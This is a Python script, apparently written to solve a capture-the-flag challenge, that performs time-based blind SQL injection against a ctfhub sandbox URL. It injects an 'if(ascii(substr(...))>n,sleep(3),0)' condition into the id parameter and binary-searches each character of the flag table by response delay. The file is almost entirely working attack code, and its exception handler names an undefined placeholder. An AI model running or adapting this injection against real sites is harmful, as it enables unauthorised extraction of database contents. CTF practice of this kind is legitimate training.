import requests
from datetime import datetime

burl = 'http://challenge-43e20d4ad0fdedf1.sandbox.ctfhub.com:10080/'
url = f"""{burl}?id=1"""
sleep_second = 3
true_delay = sleep_second - 1
query_sql = """select flag from flag"""

data = {
    'a': 'x',
    'b': 'y'
}

headers = {
    'Origin':  burl,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43',
    'Referer':  f'{burl}/admin539/login.php',
    'Connection': 'close',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded'
}

proxies = {
  'http': 'http://127.0.0.1:8080',
#   'https': 'https://127.0.0.1:8080',
}

# cookies = requests.utils.cookiejar_from_dict({'PHPSESSID': 'al9fueke3j06ggu128kjl3aoti'})

req = requests.session()
flag = ''

for length in range(1, 99):
    min_ascii = 44
    max_ascii = 125
    mid_ascii = (min_ascii + max_ascii) // 2
    while (min_ascii < max_ascii):
        curl = f"""{url} and if(ascii(substr(({query_sql}),{length},1))>{mid_ascii},sleep({sleep_second}),0)"""
        start_time = datetime.now()
        try:
            # result = req.post(url=curl, data=data, headers=headers, cookies=cookies)
            result = req.post(url=curl, data=data, headers=headers)
        except expression as identifier:
            continue
        end_time = datetime.now()
        delay = (end_time - start_time).seconds
        if delay > true_delay:
            min_ascii = mid_ascii + 1
        else:
            max_ascii = mid_ascii
        mid_ascii = (min_ascii + max_ascii) // 2
    flag += chr(mid_ascii)
    print(flag)